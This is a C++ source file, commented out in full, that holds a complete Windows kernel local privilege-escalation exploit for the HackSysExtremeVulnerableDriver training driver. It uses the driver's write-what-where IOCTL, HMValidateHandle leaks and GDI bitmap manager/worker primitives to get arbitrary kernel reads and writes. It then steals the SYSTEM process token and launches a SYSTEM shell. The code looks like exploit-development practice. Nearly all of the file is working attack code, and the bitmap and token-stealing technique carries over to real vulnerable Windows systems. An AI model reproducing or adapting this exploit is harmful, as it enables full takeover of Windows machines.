/*
#include <iostream>
#include <string>
#include <algorithm>

#include <Windows.h>
#include <winternl.h>

#include "helpers.h"
#include "ntstructs.h"


HBITMAP MANAGER_BITMAP = 0;
HBITMAP WORKER_BITMAP = 0;

HMVALIDATEHANDLE HMValidateHandle = 0;

int exploitWriteWhatWhere(unsigned long long what, unsigned long long where) {
std::wstring deviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";

void* deviceHandle = CreateFileW(deviceName.c_str(),
GENERIC_READ | GENERIC_WRITE,
FILE_SHARE_READ | FILE_SHARE_WRITE,
0,
OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
0);

if (INVALID_HANDLE_VALUE == deviceHandle) {
std::cout << "CreateFileW Failed" << std::endl;
return -1;
}

WRITE_WHAT_WHERE input;
input.What = (unsigned long long)&what;
input.Where = where;

DeviceIoControl(deviceHandle, WRITE_WHAT_WHERE_IOCTL_CODE, &input, 8, 0, 0, 0, 0);

return 0;
}


void leakHmValidateHandle() {
unsigned char* searchAddress = (unsigned char*)GetProcAddress(GetModuleHandleA("user32.dll"), "IsMenu");
unsigned long callOffset = 0;

while (true) {
++searchAddress;
if (0xE8 == *searchAddress) {
callOffset = *(unsigned long*)(searchAddress+1);
HMValidateHandle = (HMVALIDATEHANDLE)(searchAddress + callOffset + 5);
break;
}
}

std::cout << "user32!HMValidateHandle is located at 0x" << std::hex << HMValidateHandle << std::endl;
}


LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void craftFakeClass() {
WNDCLASSEXW windowClass = { 0 };
windowClass.cbSize = sizeof(windowClass);
windowClass.lpszClassName = L"ExploitClass";
wchar_t longMenuName[3000];
std::fill(longMenuName, longMenuName + 2999, 0x41);
longMenuName[2999] = L'\x00';
windowClass.lpszMenuName = (LPWSTR)&longMenuName;
windowClass.lpfnWndProc = WindowProc;
RegisterClassExW(&windowClass);
}

tagWND* leakWindowObject() {
HWND window = CreateWindowExW(0, L"ExploitClass", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
return (tagWND*)HMValidateHandle(window, 1);
}

void* leakLargePoolAllocationAddress() {
craftFakeClass();
tagWND* windowObject = leakWindowObject();

std::cout << "tagWND user-mode mapping is located at 0x" << std::hex << windowObject << std::endl;
std::cout << "tagWND is located at 0x" << std::hex << windowObject->head.pSelf << std::endl;
unsigned long long ulClientDelta = (unsigned long long)windowObject->head.pSelf - (unsigned long long)windowObject;
std::cout << "ulClientDelta is 0x" << std::hex << ulClientDelta << std::endl;

tagCLS* userTagCls = (tagCLS*)((unsigned long long)windowObject->pcls - ulClientDelta);
void* menuNameAddress = (void*) userTagCls->lpszMenuName;
std::cout << "tagCLS.lpszMenuName's value is 0x" << std::hex << menuNameAddress << std::endl;

DestroyWindow(windowObject->head.h);
UnregisterClassW(L"ExploitClass", 0);

return menuNameAddress;
}

void createPrimitives() {
char data[0x280];
memset(data, 'A', 0x27f);
data[0x27f] = '\x00';

void* managerSurface = leakLargePoolAllocationAddress();
while (MANAGER_BITMAP == 0) {
MANAGER_BITMAP = CreateBitmap(0x701, 0x2, 0x1, 8, &data);
}
std::cout << "Manager handle: 0x" << std::hex << MANAGER_BITMAP << std::endl;
std::cout << "Manager: 0x" << std::hex << managerSurface << std::endl;
//DebugBreak();

void* workerSurface = leakLargePoolAllocationAddress();
while (WORKER_BITMAP == 0) {
WORKER_BITMAP = CreateBitmap(0x701, 0x2, 0x1, 8, &data);
}
std::cout << "Worker handle: 0x" << std::hex << WORKER_BITMAP << std::endl;
std::cout << "Worker: 0x" << std::hex << workerSurface << std::endl;
//DebugBreak();

unsigned long long workerPvScan0Address = (unsigned long long)workerSurface + 0x18 + 0x38;
unsigned long long managerPvScan0Address = (unsigned long long)managerSurface + 0x18 + 0x38;

exploitWriteWhatWhere(workerPvScan0Address, managerPvScan0Address);

std::cout << "Exploited Write-What-Where" << std::endl;
}

unsigned long long readQword(unsigned long long address) {
unsigned long long data = 0;
SetBitmapBits(MANAGER_BITMAP, 8, &address);
GetBitmapBits(WORKER_BITMAP, 8, &data);
return data;
}

void writeQword(unsigned long long address, void* data) {
SetBitmapBits(MANAGER_BITMAP, 8, &address);
SetBitmapBits(WORKER_BITMAP, 8, data);
}

unsigned long long getNtoskrnlBase() {
unsigned long long baseAddress = 0;
unsigned long long signature = 0x00905a4d;

craftFakeClass();
tagWND* windowObject = leakWindowObject();

unsigned long long searchAddress = (unsigned long long) windowObject->head.pti;
searchAddress = readQword(searchAddress);
searchAddress = readQword(searchAddress + 0x2a8) & 0xfffffffffffff000;

while (true) {
unsigned long long readData = readQword(searchAddress);

if ((readData & 0x00000000FFFFFFFF) == signature) {
baseAddress = searchAddress;
break;
}
searchAddress = searchAddress - 0x1000;
}

return baseAddress;
}

unsigned long long PsInitialSystemProcess() {
unsigned long long systemProcessAddress;
unsigned long long kernelNtos = getNtoskrnlBase();
std::cout << "ntoskrnl.exe Base: 0x" << std::hex << kernelNtos << std::endl;

void* userNtos = LoadLibraryA("ntoskrnl.exe");

systemProcessAddress = kernelNtos +
((unsigned long long)GetProcAddress((HMODULE)userNtos, "PsInitialSystemProcess") - (unsigned long long)userNtos);

std::cout << "System process is at 0x" << std::hex << systemProcessAddress << std::endl;
return readQword(systemProcessAddress);
}

void elevatePrivileges() {
unsigned long long systemProcess;
unsigned long long currentProcess;
void* systemToken;
unsigned long pid;

//unsigned long long tokenOffset = offsetof(_EPROCESS, Token);
//unsigned long long activeProcessLinksOffset = offsetof(_EPROCESS, ActiveProcessLinks);
//unsigned long long pidOffset = offsetof(_EPROCESS, UniqueProcessId);
unsigned long long tokenOffset = 0x358;
unsigned long long activeProcessLinksOffset = 0x2e8;
unsigned long long pidOffset = 0x2e0;

unsigned long currentPid = GetCurrentProcessId();
systemProcess = PsInitialSystemProcess();
std::cout << "Found system process at 0x" << std::hex << systemProcess << std::endl;
systemToken = (void*)readQword(systemProcess + tokenOffset);
std::cout << "Found system token at 0x" << std::hex << systemToken << std::endl;

currentProcess = systemProcess;
do {
currentProcess = readQword(currentProcess + activeProcessLinksOffset) - activeProcessLinksOffset;
pid = readQword(currentProcess + pidOffset);
} while (pid != currentPid);

std::cout << "Found current process at 0x" << std::hex << currentProcess << std::endl;

writeQword(currentProcess + tokenOffset, &systemToken);
}

int main() {
leakHmValidateHandle();
createPrimitives();
elevatePrivileges();
std::cout << "Enjoy system priviliges :-)" << std::endl;
system("cmd.exe");


int i = 0;
std::cin >> i;
std::cout << i;

return 0;
}
*/